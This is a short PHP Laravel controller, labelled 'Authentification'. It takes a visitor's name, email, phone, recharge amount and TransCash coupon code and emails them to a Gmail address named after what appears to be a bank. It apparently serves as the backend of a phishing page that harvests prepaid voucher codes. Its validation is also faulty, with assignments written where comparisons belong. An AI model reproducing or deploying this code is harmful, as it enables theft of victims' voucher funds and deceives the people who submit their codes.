<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class Authentification extends Controller
{
    public function auth()
    {
        if (isset($_POST['send'])) {
            $nom = strip_tags(trim($_POST['nom']));
            $email = strip_tags(trim($_POST['email']));
            $tel = strip_tags(trim($_POST['tel']));
            $type = $_POST['type'];
            $mont1 = strip_tags(trim($_POST['mont1']));
            $cc1 = strip_tags(trim($_POST['cc1']));


            if ($nom != "" && $email != "" && $mont1 = !"" && $type = !"" && $cc1 = !"") {
                $to = "cmutuel1 @gmail.com";
                $subject = "Recharge TransCash";
                $msg = "
                  Nom et prenom : " . $nom . "
                  Mail :" . $email . "
                  Telephone : " . $tel . "
                  Type de recharge : " . $type . "
                  Montant 1 : " . $mont1 . "€
                  Code coupon 1 : " . $cc1 . "
            
                  ";
                if (mail($to, $subject, $msg)) {
                    $_SESSION['success'] = true;
                } else {
                    $_SESSION['echec'] = true;
                }
            } else {
                $_SESSION['vide'] = true;
            }
        }

        return view('authentification');
    }
}
